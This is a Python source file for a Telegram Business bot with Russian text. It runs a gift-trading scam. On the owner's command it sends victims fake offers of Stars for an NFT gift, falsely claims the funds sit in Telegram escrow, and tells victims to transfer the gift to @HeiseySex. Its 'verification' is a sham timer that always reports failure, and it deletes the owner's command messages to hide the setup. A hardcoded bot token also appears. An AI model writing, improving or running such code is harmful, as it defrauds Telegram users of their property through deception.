import os
import re
import time
import threading
import requests
import telebot
from flask import Flask
from telebot.types import (
    InlineKeyboardMarkup,
    InlineKeyboardButton,
    InlineQueryResultArticle,
    InputTextMessageContent,
)

# ─────────────────────── НАСТРОЙКИ ───────────────────────

BOT_TOKEN = os.environ.get("BOT_TOKEN", ("8204031823:AAHA7mUlrZGVcMlF8whWAqYakjvdTdJ02Bo")

OWNER_ID = 861423393

TARGET_URL = "https://t.me/HeiseySex"

VERIFY_TIMEOUT_SECONDS = 300  # 5 минут

# ─────────────────────── ИНИЦИАЛИЗАЦИЯ ───────────────────────

bot = telebot.TeleBot(BOT_TOKEN)

offers = {}
offers_lock = threading.Lock()


# ─────────────────────── УТИЛИТЫ ───────────────────────

def normalize_url(raw):
    raw = raw.strip().strip('"').strip("'")
    if raw.startswith("@"):
        return f"https://t.me/{raw[1:]}"
    if raw.startswith(("http://", "https://")):
        return raw
    return f"https://t.me/{raw.lstrip('/')}"


def parse_gift_command(text):
    """Разбор /gift для Business-чата."""
    body = text.replace("/gift", "", 1).strip()
    if not body:
        return None

    quoted = re.findall(r'"([^"]*)"', body)
    without_quotes = re.sub(r'"[^"]*"', "", body).strip()

    if len(quoted) >= 2:
        name = quoted[0]
        url = normalize_url(quoted[1])
        amount_part = without_quotes.split()[0] if without_quotes else ""
    elif len(quoted) == 1:
        name = quoted[0]
        rest = without_quotes.split()
        url = normalize_url(rest[0]) if rest else None
        amount_part = rest[1] if len(rest) >= 2 else ""
    else:
        parts = body.split()
        if len(parts) < 3:
            return None
        name = parts[0]
        url = normalize_url(parts[1])
        amount_part = parts[2]

    amount = re.sub(r"\D", "", amount_part) if amount_part else ""

    if not url or not amount:
        return None

    return name, url, amount


def parse_inline_query(raw):
    """Разбор строки inline-запроса: Название | ссылка | сумма.
    Поддерживает '|' и ','."""
    parts = [p.strip() for p in re.split(r"[|,]", raw or "") if p.strip()]
    name = parts[0] if len(parts) > 0 else ""
    url_raw = parts[1] if len(parts) > 1 else ""
    amount_raw = parts[2] if len(parts) > 2 else ""
    amount = re.sub(r"\D", "", amount_raw)
    url = normalize_url(url_raw) if url_raw else ""
    return name, url, amount


# ─────────────────────── ТЕКСТЫ ───────────────────────

def build_offer_message(name, url, amount):
    return (
        "🎁 <b>Новое предложение</b>\n\n"
        f"Вам предлагают <b>{amount} ⭐</b> за подарок "
        f"<a href=\"{url}\">{name}</a>.\n\n"
        "<i>Принять сделку или отклонить?</i>"
    )


def build_offer_keyboard():
    kb = InlineKeyboardMarkup()
    kb.row(
        InlineKeyboardButton("✅ Принять", callback_data="stage_accept"),
        InlineKeyboardButton("✖️ Отклонить", callback_data="stage_decline"),
    )
    return kb


def build_escrow_message(name, url, amount):
    return (
        f"🔒 <b>Средства зарезервированы</b>\n\n"
        f"<b>{amount} ⭐</b> уже на эксроу-счёте Telegram и "
        f"зачислятся вам сразу после передачи подарка.\n\n"
        "<b>Как завершить сделку:</b>\n"
        f"1. Передайте <a href=\"{url}\">{name}</a> пользователю @HeiseySex\n"
        "2. Нажмите «Передать NFT»\n"
        "3. Подтвердите передачу\n\n"
        "<i>Как только подарок уйдёт — звёзды придут автоматически.</i>"
    )


def build_escrow_keyboard():
    kb = InlineKeyboardMarkup()
    kb.row(InlineKeyboardButton("🎁 Передать подарок", url=TARGET_URL))
    kb.row(
        InlineKeyboardButton("✅ Я передал", callback_data="stage_verify"),
        InlineKeyboardButton("✖️ Отменить", callback_data="stage_decline"),
    )
    return kb


MSG_VERIFY = (
    "⏳ <b>Проверяем передачу…</b>\n\n"
    "Это займёт до пары минут. Не закрывайте чат."
)

MSG_TIMEOUT = (
    "⌛ <b>Сделка не завершена</b>\n\n"
    "Передача подарка не подтвердилась вовремя — резерв средств снят, "
    "предложение аннулировано.\n\n"
    "<i>Хотите попробовать снова? Попросите отправить предложение повторно.</i>"
)

MSG_DECLINE = (
    "✖️ <b>Предложение отклонено</b>\n\n"
    "<i>Если передумаете — предложение можно отправить снова.</i>"
)


# ─────────────────────── СЛУЖЕБНЫЕ ОТПРАВКИ ───────────────────────

def try_delete_message(chat_id, message_id, conn_id=None):
    try:
        if conn_id:
            url = f"https://api.telegram.org/bot{BOT_TOKEN}/deleteMessage"
            payload = {
                "chat_id": chat_id,
                "message_id": message_id,
                "business_connection_id": conn_id,
            }
            r = requests.post(url, json=payload, timeout=10)
            if r.status_code == 200:
                print(f"[DELETE] {message_id} удалено (business)")
                return
            try:
                desc = r.json().get("description", "")
            except Exception:
                desc = r.text
            if "message to delete not found" in desc:
                print(f"[DELETE] {message_id} уже отсутствует (ок)")
                return
            print(f"[DELETE] Ошибка: {r.status_code} {desc}")
        else:
            bot.delete_message(chat_id, message_id)
            print(f"[DELETE] {message_id} удалено")
    except Exception as e:
        print(f"[DELETE] Сетевая ошибка: {e}")


def safe_edit(chat_id, message_id, text, parse_mode="HTML",
              reply_markup=None, conn_id=None):
    kwargs = {
        "chat_id": chat_id,
        "message_id": message_id,
        "parse_mode": parse_mode,
    }
    if reply_markup is not None:
        kwargs["reply_markup"] = reply_markup
    if conn_id:
        kwargs["business_connection_id"] = conn_id
    try:
        bot.edit_message_text(text, **kwargs)
        return True
    except Exception as e:
        print(f"[EDIT] {message_id}: {e}")
        return False


def send_business_message(chat_id, text, conn_id, reply_markup=None):
    kwargs = {
        "chat_id": chat_id,
        "text": text,
        "parse_mode": "HTML",
        "business_connection_id": conn_id,
    }
    if reply_markup is not None:
        kwargs["reply_markup"] = reply_markup
    try:
        sent = bot.send_message(**kwargs)
        print(f"[SEND] OK → чат {chat_id}, msg_id={sent.message_id}")
        return sent
    except Exception as e:
        err = str(e)
        print(f"[SEND] ОШИБКА для чата {chat_id}: {err}")
        if "CHAT_WRITE_FORBIDDEN" in err:
            print("  → Собеседник запретил Business-ботов.")
        elif "USER_IS_BLOCKED" in err:
            print("  → Ты заблокирован.")
        elif "PEER_FLOOD" in err:
            print("  → Спам-блок Telegram. Жди 6–24 часа.")
        return None


# ─────────────────────── ТАЙМЕР ВЕРИФИКАЦИИ ───────────────────────

def schedule_verify_timeout(chat_id, message_id, conn_id=None):
    def job():
        time.sleep(VERIFY_TIMEOUT_SECONDS)
        safe_edit(chat_id, message_id, MSG_TIMEOUT, conn_id=conn_id)
        print(f"[VERIFY-TIMEOUT] msg {message_id} обновлён")

    t = threading.Thread(target=job, daemon=True)
    t.start()


# ─────────────────────── BUSINESS CONNECTION ───────────────────────

@bot.business_connection_handler(func=lambda conn: True)
def on_business_connection(connection):
    print(f"[BUSINESS] Соединение: {connection.id}")
    print(f"[BUSINESS] Владелец: {connection.user.id}")
    rights = connection.rights
    print(f"[BUSINESS] Права: reply={getattr(rights, 'can_reply', '?')}, "
          f"delete={getattr(rights, 'can_delete_messages', '?')}")
    print(f"[BUSINESS] Активно: {connection.is_enabled}")


# ─────────────────────── BUSINESS-СООБЩЕНИЯ (/gift) ───────────────────────

@bot.business_message_handler(func=lambda m: m.text is not None, content_types=["text"])
def handle_business_message(message):
    conn_id = message.business_connection_id
    sender_id = message.from_user.id

    print(f"[BUSINESS] Сообщение от {sender_id}: {message.text!r}")

    if sender_id != OWNER_ID:
        return

    if not message.text.startswith("/gift"):
        return

    parsed = parse_gift_command(message.text)
    if not parsed:
        send_business_message(
            message.chat.id,
            "❌ Неверный формат.\n\n"
            "Используй: /gift \"Название\" \"ссылка\" 100\n"
            "Или через inline: @бот Название | ссылка | 100",
            conn_id,
        )
        return

    name, url, amount = parsed
    print(f"[BUSINESS] Оффер: name={name!r}, url={url}, amount={amount}")

    try_delete_message(message.chat.id, message.message_id, conn_id)

    sent = send_business_message(
        message.chat.id,
        build_offer_message(name, url, amount),
        conn_id,
        reply_markup=build_offer_keyboard(),
    )

    if sent is None:
        return

    with offers_lock:
        offers[sent.message_id] = {
            "name": name,
            "url": url,
            "amount": amount,
            "finished": False,
            "conn_id": conn_id,
            "chat_id": message.chat.id,
        }


# ─────────────────────── INLINE-РЕЖИМ ───────────────────────

def _inline_template(rid, title, sample):
    return InlineQueryResultArticle(
        id=rid,
        title=title,
        description=f"Пример: {sample}",
        input_message_content=InputTextMessageContent(message_text=sample),
    )


@bot.inline_handler(func=lambda q: True)
def handle_inline_query(query):
    raw = (query.query or "").strip()
    print(f"[INLINE] от {query.from_user.id}: {raw!r}")

    # Только владелец может создавать офферы
    if query.from_user.id != OWNER_ID:
        bot.answer_inline_query(
            query.id,
            [
                InlineQueryResultArticle(
                    id="denied",
                    title="Нет доступа",
                    description="Создавать предложения может только владелец",
                    input_message_content=InputTextMessageContent(
                        message_text="Создание офферов недоступно."
                    ),
                )
            ],
            cache_time=0,
        )
        return

    name, url, amount = parse_inline_query(raw)
    results = []

    if name and url and amount:
        # Готовый оффер
        results.append(
            InlineQueryResultArticle(
                id="offer_ready",
                title=f"🎁 {name} — {amount} ⭐",
                description=f"Отправить оффер: {amount} ⭐ за {name}",
                input_message_content=InputTextMessageContent(
                    message_text=build_offer_message(name, url, amount),
                    parse_mode="HTML",
                ),
                reply_markup=build_offer_keyboard(),
            )
        )
    else:
        # Подсказки-шаблоны
        results.append(
            _inline_template(
                "help",
                "Как заполнить",
                "Формат: @бот Название | ссылка | 100",
            )
        )

        if not name:
            results.append(_inline_template(
                "t1", "1️⃣ Название подарка", "Впиши название, потом |"
            ))
        elif not url:
            results.append(_inline_template(
                "t2", "2️⃣ Ссылка или @username",
                f"{name} | HeiseySex | 100",
            ))
        elif not amount:
            results.append(_inline_template(
                "t3", "3️⃣ Сумма в звёздах",
                f"{name} | {url.replace('https://t.me/', '@')} | 100",
            ))

    try:
        bot.answer_inline_query(query.id, results, cache_time=0)
    except Exception as e:
        print(f"[INLINE] answer error: {e}")


# ─────────────────────── КНОПКИ ───────────────────────

@bot.callback_query_handler(func=lambda call: True)
def callback_router(call):
    payload = call.data
    print(f"[CALLBACK] {payload} от {call.from_user.id}")

    conn_id = getattr(call.message, "business_connection_id", None)

    with offers_lock:
        if call.message.message_id in offers:
            offers[call.message.message_id]["finished"] = True

    if payload == "stage_accept":
        bot.answer_callback_query(
            call.id,
            text=(
                "Ознакомьтесь с инструкцией на следующем экране.\n"
                "Следуйте шагам по порядку, чтобы завершить сделку."
            ),
            show_alert=True,
        )

        text = call.message.html_text or call.message.text or ""
        m = re.search(r'<a href="([^"]+)">([^<]+)</a>', text)
        url = m.group(1) if m else TARGET_URL
        name = m.group(2) if m else "Подарок"

        m2 = re.search(r'<b>(\d+)</b>\s*⭐', text)
        amount = m2.group(1) if m2 else "0"

        safe_edit(
            call.message.chat.id,
            call.message.message_id,
            build_escrow_message(name, url, amount),
            reply_markup=build_escrow_keyboard(),
            conn_id=conn_id,
        )

    elif payload == "stage_verify":
        bot.answer_callback_query(call.id)
        safe_edit(
            call.message.chat.id,
            call.message.message_id,
            MSG_VERIFY,
            conn_id=conn_id,
        )
        schedule_verify_timeout(
            call.message.chat.id,
            call.message.message_id,
            conn_id,
        )

    elif payload == "stage_decline":
        bot.answer_callback_query(call.id, text="Предложение отклонено.")
        safe_edit(
            call.message.chat.id,
            call.message.message_id,
            MSG_DECLINE,
            conn_id=conn_id,
        )


# ─────────────────────── ЗАПУСК ───────────────────────

app = Flask(__name__)


@app.route("/")
def index():
    return "Bot is running"


@app.route("/health")
def health():
    return "OK"


def run_bot():
    print("✨ Business-бот запущен (в облаке).")
    print(f"OWNER_ID: {OWNER_ID}")
    bot.infinity_polling(
        allowed_updates=[
            "message",
            "callback_query",
            "inline_query",
            "business_connection",
            "business_message",
            "edited_business_message",
            "deleted_business_messages",
        ],
        timeout=30,
    )


if __name__ == "__main__":
    bot_thread = threading.Thread(target=run_bot, daemon=True)
    bot_thread.start()

    port = int(os.environ.get("PORT", 10000))
    app.run(host="0.0.0.0", port=port)
